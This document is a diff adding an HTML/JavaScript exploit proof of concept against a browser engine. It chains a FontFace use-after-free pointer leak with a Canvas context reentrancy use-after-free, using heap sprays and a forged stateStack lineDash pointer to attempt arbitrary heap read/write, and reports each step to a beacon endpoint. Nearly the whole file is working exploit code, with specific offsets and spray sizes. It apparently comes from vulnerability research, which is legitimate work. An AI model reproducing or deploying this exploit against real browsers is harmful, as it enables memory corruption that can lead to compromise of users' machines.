@@ -1,0 +1,312 @@
+<!--
+  p575: Combined FontFace UAF leak + Canvas write primitive → arbitrary R/W.
+  
+  Combines:
+    - FontFaceSet::load() UAF leak (p563/p564): leaks heap pointers at +0x58/+0x68
+    - Canvas getContext reentrancy UAF (p553): bidirectional R/W via stale wrapper
+  
+  Goal: Use the leaked FontFace pointer to forge the Canvas stateStack,
+  then achieve arbitrary heap read/write through the forged stateStack.
+  
+  Path:
+    1. Trigger FontFaceSet::load() UAF → leak +0x58/+0x68
+    2. Trigger Canvas getContext UAF → get stale + live context
+    3. Spray to reclaim the freed Canvas slot
+    4. Use the leaked FontFace pointer to forge the Canvas stateStack
+    5. Read/write through the forged stateStack → arbitrary R/W
+  
+  The key insight: if we can forge the stateStack ptr/cap/size using the
+  leaked FontFace pointer, we can read/write arbitrary heap through
+  getLineDash() / setLineDash().
+  
+  CRASH_CLASS: HIGH (engine may crash on bad forge)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p575 combined fontface-canvas rw</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(a,o){var s='';for(var i=0;i<8;i++){var v=a[o+i];s+=(v<16?'0':'')+v.toString(16);}return s;}
+function grab(v,o){var a=[];for(var i=0;i<8;i++)a.push(v[o+i]);return a;}
+function close(x,y){return Math.abs(x-y)<0.0001;}
+
+/* ================================================================
+   PHASE 1: FontFace UAF leak (p563/p564 style)
+   ================================================================ */
+
+var leaked58=null,leaked68=null;
+var abMap=[];
+
+function phase1(){
+  b('P575-PH1-START');
+  
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(styleEl);
+  
+  var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);void A.loaded;
+  
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    styleEl.remove();styleEl.textContent='';styleEl=null;
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    abMap=[];
+    var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+    for(var si=0;si<SIZES.length;si++){
+      for(var k=0;k<8;k++){
+        var ab=new ArrayBuffer(SIZES[si]);
+        abMap.push({size:SIZES[si],view:new Uint8Array(ab)});
+      }
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },set:function(){}});
+  
+  b('P575-PH1-LOAD');
+  document.fonts.load('1em f0, s0','AB').then(function(){b('P575-PH1-RESOLVED');},function(){b('P575-PH1-REJECTED');});
+  
+  setTimeout(scanPhase1,100);
+  setTimeout(scanPhase1,400);
+  setTimeout(function(){if(!leaked58)b('P575-PH1-TIMEOUT');},2000);
+}
+
+function scanPhase1(){
+  if(leaked58)return;
+  for(var i=0;i<abMap.length;i++){
+    var v=abMap[i].view,nz=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+    if(nz>0&&abMap[i].size===192){
+      leaked58=grab(v,0x58);leaked68=grab(v,0x68);
+      b('P575-PH1-HIT-b'+i+'-nz'+nz+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
+      setTimeout(phase2,100);
+      return;
+    }
+  }
+  /* Check any non-192 hit */
+  for(var i=0;i<abMap.length;i++){
+    var v=abMap[i].view,nz=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+    if(nz>0){b('P575-PH1-WRONGSIZE-b'+i+'-s'+abMap[i].size+'-nz'+nz);return;}
+  }
+}
+
+/* ================================================================
+   PHASE 2: Canvas getContext UAF (p553 style)
+   ================================================================ */
+
+var canvasInner=null,canvasOuter=null;
+var retained=[];
+
+function phase2(){
+  if(!leaked58){b('P575-PH2-NOLEAK');return;}
+  b('P575-PH2-START-p58='+hex8(leaked58,0)+'-p68='+hex8(leaked68,0));
+  
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;document.body.appendChild(canvas);
+  retained.push(canvas);
+  
+  var getterFired=0;
+  var opts={};
+  Object.defineProperty(opts,'desynchronized',{get:function(){
+    getterFired++;
+    if(getterFired===1)canvasInner=canvas.getContext('2d');
+    return false;
+  },enumerable:true});
+  
+  try{canvasOuter=canvas.getContext('2d',opts);}catch(e){b('P575-PH2-CTX-ERR-'+e);return;}
+  
+  retained.push(canvasOuter,canvasInner);
+  b('P575-PH2-CTX-getter='+getterFired+'-inner='+!!canvasInner+'-outer='+!!canvasOuter+'-same='+(canvasOuter===canvasInner));
+  
+  if(canvasOuter===canvasInner||!canvasInner){b('P575-PH2-PATCHED');return;}
+  
+  /* Same-type spray */
+  var SPRAY=80,SA=11.110011,SB=22.220022,SC=33.330033,SD=44.440044,SE=55.550055,SF=66.660066;
+  var sprayCtx=[];
+  for(var i=0;i<SPRAY;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var ctx=c.getContext('2d');
+    if(ctx){ctx.setTransform(SA,SB,SC,SD,SE,SF);sprayCtx.push(ctx);retained.push(c,ctx);}
+  }
+  b('P575-PH2-SPRAYED-n='+sprayCtx.length);
+  
+  /* Verify channel */
+  var m=null;
+  try{m=canvasInner.getTransform();}catch(e){b('P575-PH2-READ-ERR-'+e);return;}
+  if(!m){b('P575-PH2-READ-FAIL');return;}
+  var match=close(m.a,SA)&&close(m.b,SB)&&close(m.c,SC)&&close(m.d,SD)&&close(m.e,SE)&&close(m.f,SF);
+  if(!match){b('P575-PH2-NO-RECLAIM');return;}
+  b('P575-PH2-CHANNEL-OK');
+  
+  /* Write primitive */
+  var WA=99.001,WB=88.002,WC=77.003,WD=66.004,WE=55.005,WF=44.006;
+  try{canvasInner.setTransform(WA,WB,WC,WD,WE,WF);}catch(e){b('P575-PH2-WRITE-ERR-'+e);return;}
+  var m2=null;
+  try{m2=canvasInner.getTransform();}catch(e){b('P575-PH2-READBACK-ERR-'+e);}
+  if(m2&&close(m2.a,WA)&&close(m2.b,WB)){b('P575-PH2-WRITE-OK');}
+  else{b('P575-PH2-WRITE-MISS');}
+  
+  /* Find aliased spray canvas */
+  var aliasIdx=-1;
+  for(var j=0;j<sprayCtx.length;j++){
+    try{var sm=sprayCtx[j].getTransform();if(sm&&close(sm.a,WA)&&close(sm.b,WB)){aliasIdx=j;break;}}
+    catch(e){}
+  }
+  if(aliasIdx>=0){b('P575-PH2-ALIAS-FOUND-idx='+aliasIdx+'-BIDIR-1');}
+  else{b('P575-PH2-ALIAS-NONE');}
+  
+  /* ================================================================
+     PHASE 3: Combined FontFace leak + Canvas write → stateStack forge
+     ================================================================ */
+  
+  if(aliasIdx<0){b('P575-PH3-SKIP-NOALIAS');return;}
+  
+  b('P575-PH3-START-BIDIR-1');
+  
+  var alias=sprayCtx[aliasIdx];
+  
+  /* Realize stateStack on the alias */
+  try{
+    for(var s=0;s<8;s++)alias.save();
+    alias.lineWidth=2.0;
+    b('P575-PH3-REALIZE-OK');
+  }catch(e){b('P575-PH3-REALIZE-ERR-'+e);return;}
+  
+  /* Check stateStack through stale */
+  var lwCheck;
+  try{lwCheck=canvasInner.lineWidth;}catch(e){lwCheck='ERR:'+e;}
+  b('P575-PH3-LW-CHECK='+lwCheck);
+  
+  /* Now try to forge the stateStack using the leaked FontFace pointer */
+  b('P575-PH3-FORGE-ATTEMPT');
+  
+  /* The stateStack buffer is at some offset in the Canvas2D context.
+     We need to forge lineDash{ptr,cap,size} at State offsets +184/+192/+196.
+     
+     State[8] (current, after 8 saves) is at buffer+3712.
+     Within State[8]: lineWidth+64, lineDash.ptr+184, .cap+192, .size+196.
+     
+     We forge lineDash.ptr = leaked58 (the FontFace heap pointer).
+     This makes getLineDash() read from the leaked address. */
+  
+  /* First, let's try to free the stateStack buffer and reclaim it */
+  /* Drop all JS references to the alias context */
+  sprayCtx[aliasIdx]=null;
+  alias=null;
+  
+  /* Remove the canvas from DOM */
+  try{if(aliasCanvas&&aliasCanvas.parentNode)aliasCanvas.parentNode.removeChild(aliasCanvas);}catch(e){}
+  aliasCanvas=null;
+  
+  b('P575-PH3-REFS-DROPPED');
+  
+  /* GC pressure */
+  for(var g=0;g<5000;g++){var _t={a:new ArrayBuffer(256)};}
+  b('P575-PH3-GC-DONE');
+  
+  /* Spray ArrayBuffer(7424) to reclaim the stateStack buffer */
+  var AB_SIZE=7424,AB_COUNT=64;
+  var abSpray=[];
+  for(var a=0;a<AB_COUNT;a++){
+    var ab=new ArrayBuffer(AB_SIZE);
+    abSpray.push({buf:ab,u8:new Uint8Array(ab),f64:new Float64Array(ab)});
+  }
+  b('P575-PH3-AB-SPRAYED-n='+abSpray.length);
+  
+  /* Write forged State[8] into each AB */
+  var STATE8_OFF=3712,LW_OFF=STATE8_OFF+64,LD_PTR_OFF=STATE8_OFF+184,LD_CAP_OFF=STATE8_OFF+192,LD_SIZE_OFF=STATE8_OFF+196;
+  
+  for(var a=0;a<abSpray.length;a++){
+    var u8=abSpray[a].u8;
+    /* lineWidth sentinel */
+    var lwBuf=new ArrayBuffer(4);new Float32Array(lwBuf)[0]=12345.0;
+    var lwBytes=new Uint8Array(lwBuf);
+    u8[LW_OFF]=lwBytes[0];u8[LW_OFF+1]=lwBytes[1];u8[LW_OFF+2]=lwBytes[2];u8[LW_OFF+3]=lwBytes[3];
+    /* lineDash.ptr = leaked58 */
+    for(var i=0;i<8;i++)u8[LD_PTR_OFF+i]=leaked58[i];
+    /* lineDash.capacity = 2, size = 2 */
+    u8[LD_CAP_OFF]=2;u8[LD_CAP_OFF+1]=0;u8[LD_CAP_OFF+2]=0;u8[LD_CAP_OFF+3]=0;
+    u8[LD_SIZE_OFF]=2;u8[LD_SIZE_OFF+1]=0;u8[LD_SIZE_OFF+2]=0;u8[LD_SIZE_OFF+3]=0;
+  }
+  b('P575-PH3-AB-FORGED');
+  
+  /* Try to read lineWidth through stale */
+  var forgedLW;
+  try{forgedLW=canvasInner.lineWidth;}catch(e){forgedLW='ERR:'+e;}
+  b('P575-PH3-FORGED-LW='+forgedLW);
+  
+  if(typeof forgedLW==='number'&&Math.abs(forgedLW-12345.0)<1.0){
+    b('P575-PH3-RECLAIM-HIT-LW=12345');
+    /* Try getLineDash */
+    var forgedDash;
+    try{forgedDash=canvasInner.getLineDash();}catch(e){forgedDash='ERR:'+e;}
+    if(Array.isArray(forgedDash)){
+      b('P575-PH3-GETLINEDASH-LEN='+forgedDash.length);
+      for(var di=0;di<forgedDash.length;di++){
+        var dBuf=new ArrayBuffer(8);new Float64Array(dBuf)[0]=forgedDash[di];
+        var dU8=new Uint8Array(dBuf);
+        b('P575-PH3-DASH-'+di+'='+hex8(dU8,0)+'-f='+forgedDash[di]);
+      }
+      b('P575-PH3-ARB-READ-SUCCESS');
+    }else{b('P575-PH3-GETLINEDASH-RESULT='+forgedDash);}
+  }else{
+    b('P575-PH3-RECLAIM-MISS-LW='+forgedLW);
+    /* Fallback: try getLineDash anyway */
+    var fallbackDash;
+    try{fallbackDash=canvasInner.getLineDash();}catch(e){fallbackDash='ERR:'+e;}
+    if(Array.isArray(fallbackDash)){
+      b('P575-PH3-FALLBACK-DASH-LEN='+fallbackDash.length+'-vals='+fallbackDash.slice(0,5).join(','));
+    }else{b('P575-PH3-FALLBACK-DASH='+fallbackDash);}
+  }
+  
+  /* ================================================================
+     PHASE 4: Try to forge stateStack using Canvas write primitive
+     ================================================================ */
+  
+  b('P575-PH4-START');
+  
+  /* The idea: use the Canvas write primitive to forge the stateStack
+     of the LIVE context, then use getLineDash() to read through it. */
+  
+  /* Realize stateStack on the LIVE context */
+  try{
+    for(var s=0;s<8;s++)alias.save();
+    alias.lineWidth=2.0;
+    b('P575-PH4-REALIZE-OK');
+  }catch(e){b('P575-PH4-REALIZE-ERR-'+e);return;}
+  
+  /* Now forge the stateStack through the stale wrapper */
+  /* We write lineWidth through the stale wrapper, which should write
+     into the live context's stateStack */
+  try{
+    canvasInner.lineWidth=99999.0;
+    var lwAfter=alias.lineWidth;
+    b('P575-PH4-LW-STALE-99999-LW-ALIAS='+lwAfter);
+    if(Math.abs(lwAfter-99999.0)<1.0){b('P575-PH4-LW-FORGE-SUCCESS');}
+    else{b('P575-PH4-LW-FORGE-MISS');}
+  }catch(e){b('P575-PH4-LW-FORGE-ERR-'+e);}
+  
+  /* Try to forge lineDash through the stale wrapper */
+  try{
+    canvasInner.setLineDash([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10]);
+    var ldAfter=alias.getLineDash();
+    if(Array.isArray(ldAfter)){
+      b('P575-PH4-LD-STALE-FORGED-ALIAS='+ldAfter.join(','));
+      if(ldAfter.length===10&&Math.abs(ldAfter[0]-1.1)<0.01){b('P575-PH4-LD-FORGE-SUCCESS');}
+      else{b('P575-PH4-LD-FORGE-MISS');}
+    }else{b('P575-PH4-LD-STALE-FORGED-ERR='+ldAfter);}
+  }catch(e){b('P575-PH4-LD-FORGE-ERR-'+e);}
+  
+  b('P575-DONE');
+}
+
+var aliasCanvas=null;
+
+function run(){
+  b('P575-BOOT');
+  phase1();
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>p575 combined fontface-canvas rw</p></body></html>
